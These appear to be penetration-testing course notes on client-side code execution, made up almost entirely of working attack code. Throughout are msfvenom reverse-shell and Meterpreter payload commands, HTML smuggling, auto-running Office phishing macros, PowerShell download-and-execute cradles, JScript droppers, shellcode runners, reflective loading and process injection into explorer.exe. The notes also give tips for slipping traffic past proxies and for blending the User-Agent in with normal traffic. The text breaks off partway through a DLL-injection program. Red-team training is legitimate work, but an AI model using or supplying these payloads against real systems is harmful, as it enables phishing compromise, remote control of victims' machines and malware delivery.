# Client Side Code Execution With Office

```bash
nc -nvlp 444
```

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.120 LPORT=444 -f exe -o shell.exe
```

## Meterpreter Handler

```bash
msfconsole -qx "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_https;set LHOST 192.168.119.120;set LPORT 443;run;"
```

```bash
msfconsole -qx "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_https;set LHOST 192.168.49.52;set LPORT 53;set AutoRunScript post/windows/manage/migrate;run;"
```

```bash
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.119.120 LPORT=443 -f exe -o msfnonstaged.exe

msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -f exe -o msfstaged.exe
```

## HTML Smuggling

### smuggling.html

HTML5 anchor tag download attribute instructs the browser to automatically download a file when a user clicks the assigned hyperlink.

```html
<html>
    <body>
      <a href="/msfstaged.exe" download="msfstaged.exe">DownloadMe</a>
   </body>
</html>
```

```html
<html>
    <body>
        <script>
          function base64ToArrayBuffer(base64) {
    		  var binary_string = window.atob(base64);
    		  var len = binary_string.length;
    		  var bytes = new Uint8Array( len );
    		  for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }
    		  return bytes.buffer;
      		}
      		
			/* msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -f exe -o msfstaged.exe
			base64 msfstaged.exe */
      		var file ='TVqQAAMAAAAEAAAA...'
      		var data = base64ToArrayBuffer(file);
      		var blob = new Blob([data], {type: 'octet/stream'});
      		var fileName = 'msfstaged.exe';
      		
			// Google Chrome
      		var a = document.createElement('a');
      		document.body.appendChild(a);
      		a.style = 'display: none';
      		var url = window.URL.createObjectURL(blob);
      		a.href = url;
      		a.download = fileName;
      		a.click();
      		window.URL.revokeObjectURL(url);
			
			// Microsoft Edge
			// window.navigator.msSaveBlob(blob, filename);
        </script>
    </body>
</html>
```

## Phishing with Microsoft Office

Save our document in a Macro-Enabled format such as `.doc` or `.docm`. The newer `.docx` will not store macros.

```VB
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    Dim str As String
    str = "powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.120/msfstaged.exe', 'msfstaged.exe')"
    Shell str, vbHide
    Dim exePath As String
    exePath = ActiveDocument.Path + "\msfstaged.exe"
    Wait (2)
    Shell exePath, vbHide
    'CreateObject("Wscript.Shell").Run str, 0
End Sub

Sub Wait(n As Long)
    Dim t As Date
    t = Now
    Do
        DoEvents
    Loop Until Now >= DateAdd("s", n, t)
End Sub
```

## Phishing PreTexting

1. With the text created, mark it and navigate to `Insert > Quick Parts > AutoTexts` and `Save Selection to AutoText Gallery`
2. In the Create New Building Block dialog box, enter the name "TheDoc"

```VB
Sub Document_Open()
    SubstitutePage
End Sub

Sub AutoOpen()
    SubstitutePage
End Sub

Sub SubstitutePage()
    ActiveDocument.Content.Select
    Selection.Delete
    ActiveDocument.AttachedTemplate.AutoTextEntries("TheDoc").Insert Where:=Selection.Range, RichText:=True
End Sub
```

## VBA Shellcode Runner

Meterpreter Handler (x86)

```bash
msfconsole -qx "use exploit/multi/handler;set payload windows/meterpreter/reverse_https;set LHOST 192.168.119.120;set LPORT 443;run;"
```

```bash
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 EXITFUNC=thread -f vbapplication
```

```VB
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr

Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr

Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr

Function MyMacro()
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As Long
    
    buf = Array(232, 130, 0, 0, 0, 96, 137, ...)

    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
    
    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter
    
    res = CreateThread(0, 0, addr, 0, 0, 0)
End Function 

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub
```

## Porting Shellcode Runner to PowerShell

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 EXITFUNC=thread -f ps1
```

```bat
powershell -exec bypass -nop -c iex((new-object system.net.webclient).downloadstring('http://192.168.119.120/run.txt'))
```

### run.txt

```pwsh
$Kernel32 = @"
using System;
using System.Runtime.InteropServices;

public class Kernel32 {
    [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32", CharSet=CharSet.Ansi)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
	[DllImport("kernel32.dll", SetLastError=true)]
    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, 
        UInt32 dwMilliseconds);
}
"@

Add-Type $Kernel32

[Byte[]] $buf = 0xfc,0xe8,0x82,0x0,0x0,0x0,0x60...
$size = $buf.Length

[IntPtr]$addr = [Kernel32]::VirtualAlloc(0,$size,0x3000,0x40);
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)
$thandle=[Kernel32]::CreateThread(0,0,$addr,0,0,0);
[Kernel32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
```

```VB
Sub MyMacro()
    Dim str As String
    str = "powershell (New-Object System.Net.WebClient).DownloadString('http://192.168.119.120/run.txt') | IEX"
    Shell str, vbHide
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub
```

## Reflection Shellcode Runner in PowerShell

### run2.txt

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 EXITFUNC=thread -f ps1
```

```bat
powershell -exec bypass -nop -c iex((new-object system.net.webclient).downloadstring('http://192.168.119.120/run2.txt'))
```

```pwsh
function LookupFunc {

	Param ($moduleName, $functionName)

	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
      Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
	return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}

function getDelegateType {

	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
		[Parameter(Position = 1)] [Type] $delType = [Void]
	)

	$type = [AppDomain]::CurrentDomain.
    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), 
    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
      DefineDynamicModule('InMemoryModule', $false).
      DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', 
      [System.MulticastDelegate])

  $type.
    DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).
      SetImplementationFlags('Runtime, Managed')

  $type.
    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
      SetImplementationFlags('Runtime, Managed')

	return $type.CreateType()
}

$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)

[Byte[]] $buf = 0xfc,0xe8,0x82,0x0,0x0,0x0...

[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)

$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)

[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)
```

## PowerShell Proxy-Aware Communication

View the proxy settings

```pwsh
[System.Net.WebRequest]::DefaultWebProxy.GetProxy("http://192.168.119.120/run.ps1")
```

Remove proxy settings by simply creating an empty object

```pwsh
$wc = new-object system.net.WebClient
$wc.proxy = $null
$wc.DownloadString("http://192.168.119.120/run.ps1")
```

In some environments, network communications not going through the proxy will get blocked at an edge firewall.

## Fiddling With The User-Agent

The Net.WebClient PowerShell download cradle does not have a default User-Agent set => The session will stand out from other legitimate traffic.

Customize User-Agent

```pwsh
$wc = new-object system.net.WebClient
$wc.Headers.Add('User-Agent', "This is my agent, there is no one like it...")
$wc.DownloadString("http://192.168.119.120/run.ps1")
```

## Give Me A SYSTEM Proxy

* -s: run it as SYSTEM
* -i: make it interactive with the current desktop

```bat
PsExec.exe -s -i C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell_ise.exe
```

A PowerShell download cradle running in **SYSTEM** integrity level context does not have a proxy configuration set and may fail to call back to our C2 infrastructure.

=> create a proxy configuration for the built-in SYSTEM account, i.e., copy a configuration from a standard user account on the system.

Proxy settings for each user are stored in the registry at the following path:
`HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\InternetSettings`

When navigating the registry, the HKEY_CURRENT_USER registry hive is mapped according to the user trying to access it, but when navigating the registry as SYSTEM, no such registry hive exists.

The **HKEY_USERS** registry hive always exists and contains the content of all user HKEY_CURRENT_USER registry hives split by their respective SIDs. Map the HKEY_USERS registry hive with the **New-PSDrive**

The HKEY_USERS hive contains the hives of all users on the computer, including SYSTEM and other local service accounts, which we want to avoid.

The registry hives are divided and named after the SIDs of existing users. Any SID starting with "**S-1-5-21-**" is a user account exclusive of built-in accounts.

To obtain a valid user hive, loop through all top level entries of the HKEY_USERS until we find one with a matching SID. Once we find one, we can filter out the lower 10 characters leaving only the SID, while omitting the HKEY_USERS string.

```pwsh
New-PSDrive -Name HKU -PSProvider Registry -Root HKEY_USERS | Out-Null
$keys = Get-ChildItem 'HKU:\'
ForEach ($key in $keys) {if ($key.Name -like "*S-1-5-21-*") {$start = $key.Name.substring(10);break}}
$proxyAddr=(Get-ItemProperty -Path "HKU:$start\Software\Microsoft\Windows\CurrentVersion\Internet Settings\").ProxyServer

[system.net.webrequest]::DefaultWebProxy = new-object System.Net.WebProxy("http://$proxyAddr")
$wc = new-object system.net.WebClient
$wc.DownloadString("http://192.168.119.120/run2.ps1")
```

# Client Side Code Execution With Windows Script Host

The default application for `.js` files is the Windows-Based Script Host

## Jscript Meterpreter Dropper

### run.js

```js
var url = "http://192.168.119.120/met.exe"
var Object = WScript.CreateObject('MSXML2.XMLHTTP');

Object.Open('GET', url, false);
Object.Send();

if (Object.Status == 200)
{
    var Stream = WScript.CreateObject('ADODB.Stream');

    Stream.Open();
    Stream.Type = 1;
    Stream.Write(Object.ResponseBody);
    Stream.Position = 0;

    Stream.SaveToFile("met.exe", 2);
    Stream.Close();
}

var r = new ActiveXObject("WScript.Shell").Run("met.exe");
```

Modify the Jscript code to make it proxy-aware with the **setProxy** method

### run2.js

```js
var url = "http://192.168.119.120/shell.exe"
var Object = WScript.CreateObject("MSXML2.ServerXMLHTTP");
Object.setProxy(2, "192.168.X.12:3128", "")

Object.open('GET', url, false);
Object.send();

if (Object.status == 200)
{
    var Stream = WScript.CreateObject('ADODB.Stream');

    Stream.Open();
    Stream.Type = 1;
    Stream.Write(Object.responseBody);
    Stream.Position = 0;

    Stream.SaveToFile("shell.exe", 2);
    Stream.Close();
}

var r = new ActiveXObject("WScript.Shell").Run("shell.exe");
```

## Shellcode Runner in C#

Create a Kali Samba share for our code

```bash
sudo apt install samba
sudo mv /etc/samba/smb.conf /etc/samba/smb.conf.old
sudo nano /etc/samba/smb.conf
```

`smb.conf`
```
[visualstudio]
 path = /home/kali/data
 browseable = yes
 read only = no
```

```bash
sudo smbpasswd -a kali

sudo systemctl start smbd
sudo systemctl start nmbd

mkdir /home/kali/data
chmod -R 777 /home/kali/data
```

```csharp
using System;
using System.Runtime.InteropServices;

namespace ShellcodeRunner
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        static void Main(string[] args)
        {
            // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.45.179 LPORT=443 EXITFUNC=thread -f csharp
            byte[] buf = new byte[722] {0x06, 0xb2, 0x79, 0x1e, 0x0a, 0x12, 0x36, 0xfa, ..., 0x2f};

            int size = buf.Length;

            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

            Marshal.Copy(buf, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
```

### Shellcode Parameter

Provide URL of the Meterpreter staged shellcode generated with msfvenom in csharp format

```csharp
using System;
using System.Runtime.InteropServices;
using System.Net.Http;
using System.Text.RegularExpressions;

namespace ShellcodeRunner
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        static void Main(string[] args)
        {
            // Check if a URL was provided
            /*
            if (args.Length == 0)
            {
                Console.WriteLine("Please provide the URL as a command-line argument.");
                return;
            }

            string url = args[0]; // Get the URL from command-line arguments
            */

            if (args.Length != 2)
            {
                Console.WriteLine("Please provide the IP and filename as command-line arguments.");
                return;
            }

            string url = "http://" + args[0] + "/" + args[1];

            try
            {
                using (HttpClient client = new HttpClient())
                {
                    // Download the file content as a string directly into memory
                    string declaration = client.GetStringAsync(url).Result; // Blocking call
                    declaration = declaration.Trim();

                    // Use a regex to extract the byte values
                    //var match = Regex.Match(declaration, @"new byte\[\d+\] \{(.*?)\};");
                    var match = Regex.Match(declaration, @"new byte\[\d+\] \{(.*?)\};", RegexOptions.Singleline);

                    if (match.Success)
                    {
                        string byteValues = match.Groups[1].Value;
                        string[] hexArray = byteValues.Split(',');

                        // Create the byte array with the dynamic size based on the number of hex values
                        byte[] buf = new byte[hexArray.Length];

                        for (int i = 0; i < hexArray.Length; i++)
                        {
                            // Convert each hex string to a byte
                            buf[i] = Convert.ToByte(hexArray[i].Trim(), 16);
                        }

                        <input code here>
                    }
                    else
                    {
                        Console.WriteLine("The file does not contain a valid byte array declaration.");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error reading file: {ex.Message}");
            }
        }
    }
}
```

## Jscript Shellcode Runner

```csharp
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

[ComVisible(true)]
public class TestClass
{
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    public TestClass()
    {
		//MessageBox.Show("Test", "Test", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);

		// msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.45.179 LPORT=443 EXITFUNC=thread -f csharp
        byte[] buf = new byte[722] {0x06, 0xb2, 0x79, 0x1e, 0x0a, 0x12, 0x36, 0xfa, ..., 0x2f};

        int size = buf.Length;

        IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

        Marshal.Copy(buf, 0, addr, size);

        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

        WaitForSingleObject(hThread, 0xFFFFFFFF);
	}

    public void RunProcess(string path)
    {
        Process.Start(path);
    }
}
```

```bat
DotNetToJScript.exe ExampleAssembly.dll --lang=Jscript --ver=v4 -o runner.js
```

## SharpShooter

SharpShooter is "a payload creation framework for the retrieval and execution of arbitrary C# source code". SharpShooter is capable of evading various types of security software.

`https://github.com/mdsecactivebreach/SharpShooter`

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -f raw -o shell.txt
```

```bash
sharpshooter --payload js --dotnetver 4 --stageless --rawscfile shell.txt --output test
```

## Reflective Load

```csharp
using System;
using System.Runtime.InteropServices;


namespace ReflectiveLoad
{
    public class Class1
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        public static void runner()
        {
            // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.45.179 LPORT=443 EXITFUNC=thread -f csharp
            byte[] buf = new byte[722] {0x06, 0xb2, 0x79, 0x1e, 0x0a, 0x12, 0x36, 0xfa, ..., 0x2f};

            int size = buf.Length;

            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

            Marshal.Copy(buf, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
```

```pwsh
(New-Object System.Net.WebClient).DownloadFile('http://192.168.119.120/ReflectiveLoad.dll', 'C:\Users\Offsec\ReflectiveLoad.dll')
$assem = [System.Reflection.Assembly]::LoadFile("C:\Users\Offsec\ReflectiveLoad.dll")
```

```pwsh
$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.119.120/ReflectiveLoad.dll')
$assem = [System.Reflection.Assembly]::Load($data)

$class = $assem.GetType("ReflectiveLoad.Class1")
$method = $class.GetMethod("runner")
$method.Invoke(0, $null)
```

# Process Injection and Migration

## Process Injection in C#

Process injection with VirtualAllocEx, WriteProcessMemory, and CreateRemoteThread is considered a standard technique, ...

### VirtualAllocEx and WriteProcessMemory

```csharp
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace ProcessInjection
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        static void Main(string[] args)
        {
            Process[] expProc = Process.GetProcessesByName("explorer");

            int pid = expProc[0].Id;

            IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);

            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);

            // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.45.179 LPORT=443 EXITFUNC=thread -f csharp
            byte[] buf = new byte[722] {0x06, 0xb2, 0x79, 0x1e, 0x0a, 0x12, 0x36, 0xfa, ..., 0x2f};

            IntPtr outSize;

            WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);

            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        }
    }
}
```

The low-level native APIs NtCreateSection, NtMapViewOfSection, NtUnMapViewOfSection, and NtClose in ntdll.dll can be used as alternatives to VirtualAllocEx and WriteProcessMemory.

### NtCreateSection, NtMapViewOfSection, NtUnMapViewOfSection, and NtClose in ntdll.dll

```csharp
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace ProcessInjection2
{
    class Program
    {
		[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
		static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

		[DllImport("kernel32.dll")]
		static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

		[DllImport("kernel32.dll")]
		static extern IntPtr GetCurrentProcess();

		[DllImport("ntdll.dll", SetLastError = true, ExactSpelling = true)]
		static extern UInt32 NtCreateSection(ref IntPtr SectionHandle, uint DesiredAccess, IntPtr ObjectAttributes,	ref uint MaximumSize, uint SectionPageProtection, uint AllocationAttributes, IntPtr FileHandle);

		[DllImport("ntdll.dll", SetLastError = true)]
		static extern uint NtMapViewOfSection(IntPtr SectionHandle,	IntPtr ProcessHandle, ref IntPtr BaseAddress, UIntPtr ZeroBits,	UIntPtr CommitSize, out ulong SectionOffset, out uint ViewSize,	uint InheritDisposition, uint AllocationType, uint Win32Protect);
	
		[DllImport("ntdll.dll", SetLastError = true)]
		static extern uint NtUnmapViewOfSection(IntPtr hProc, IntPtr baseAddr);

		[DllImport("ntdll.dll", ExactSpelling = true, SetLastError = false)]
		static extern int NtClose(IntPtr hObject);

		static void Main(string[] args)
        {
			// msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.45.179 LPORT=443 EXITFUNC=thread -f csharp
            byte[] buf = new byte[722] {0x06, 0xb2, 0x79, 0x1e, 0x0a, 0x12, 0x36, 0xfa, ..., 0x2f};

			uint buffer_size = (uint)buf.Length;

			// Create the section handle.
			IntPtr ptr_section_handle = IntPtr.Zero;
			UInt32 create_section_status = NtCreateSection(ref ptr_section_handle, 0xe, IntPtr.Zero, ref buffer_size, 0x40, 0x08000000, IntPtr.Zero);
			if (create_section_status != 0 || ptr_section_handle == IntPtr.Zero)
				return;

			// Map a view of a section into the virtual address space of the current process.
			ulong section_offset = 0;
			IntPtr ptr_local_section_addr = IntPtr.Zero;
			UInt32 local_map_view_status = NtMapViewOfSection(ptr_section_handle, GetCurrentProcess(), ref ptr_local_section_addr, (UIntPtr)(long)IntPtr.Zero, (UIntPtr)(long)IntPtr.Zero, out section_offset, out buffer_size, 0x2, 0, 0x04);
			if (local_map_view_status != 0 || ptr_local_section_addr == IntPtr.Zero)
				return;

			// Copy the shellcode into the mapped section.
			Marshal.Copy(buf, 0, ptr_local_section_addr, buf.Length);

			// Map a view of the section in the virtual address space of the targeted process.
			Process[] expProc = Process.GetProcessesByName("explorer");
			int pid = expProc[0].Id;
			IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
			IntPtr ptr_remote_section_addr = IntPtr.Zero;
			uint remote_map_view_status = NtMapViewOfSection(ptr_section_handle, hProcess, ref ptr_remote_section_addr, (UIntPtr)(long)IntPtr.Zero, (UIntPtr)(long)IntPtr.Zero, out section_offset, out buffer_size, 0x2, 0, 0x20);
			if (remote_map_view_status != 0 || ptr_remote_section_addr == IntPtr.Zero)
				return;

			// Unmap the view of the section from the current process & close the handle.
			NtUnmapViewOfSection(GetCurrentProcess(), ptr_local_section_addr);
			NtClose(ptr_section_handle);
			CreateRemoteThread(hProcess, IntPtr.Zero, 0, ptr_remote_section_addr, IntPtr.Zero, 0, IntPtr.Zero);
		}
    }
}
```

## Process Injection in PowerShell

### run3.txt

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 EXITFUNC=thread -f ps1
```

```bat
powershell -exec bypass -nop -c iex((new-object system.net.webclient).downloadstring('http://192.168.119.120/run3.txt'))
```

```pwsh
function LookupFunc {

	Param ($moduleName, $functionName)

	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
      Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
	return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}

function getDelegateType {

	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
		[Parameter(Position = 1)] [Type] $delType = [Void]
	)

	$type = [AppDomain]::CurrentDomain.
    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), 
    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
      DefineDynamicModule('InMemoryModule', $false).
      DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', 
      [System.MulticastDelegate])

  $type.
    DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).
      SetImplementationFlags('Runtime, Managed')

  $type.
    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
      SetImplementationFlags('Runtime, Managed')

	return $type.CreateType()
}

$id = (Start-Process Notepad -passthru -WindowStyle hidden).ID

$hProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll OpenProcess), (getDelegateType @([UInt32], [Bool], [Int]) ([IntPtr]))).Invoke(0x001F0FFF, $false, $id)
        
$addr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAllocEx), (getDelegateType @([IntPtr], [IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke($hProcess, [IntPtr]::Zero, 0x1000, 0x3000, 0x40)

[Byte[]] $buf = 0xfc,0xe8,0x82,0x0,0x0,0x0...
     
$outSize = 0
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WriteProcessMemory), (getDelegateType @([IntPtr], [IntPtr], [Byte[]], [Int32], [Int].MakeByRefType()) ([Bool]))).Invoke($hProcess, $addr, $buf, $buf.length, [ref] $outSize)
#[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WriteProcessMemory), (getDelegateType @([IntPtr], [IntPtr], [Byte[]], [Int32], [Int].MakeByRefType()) ([Bool]))).Invoke($hProcess, $addr, $buf, $buf.length, [ref] 0)
       
$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateRemoteThread), (getDelegateType @([IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke($hProcess, [IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
```

## DLL Injection with C#

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -f dll -o met.dll
```

```csharp
using System;
using System.Diagnostics;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;

namespace DLLInjection
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
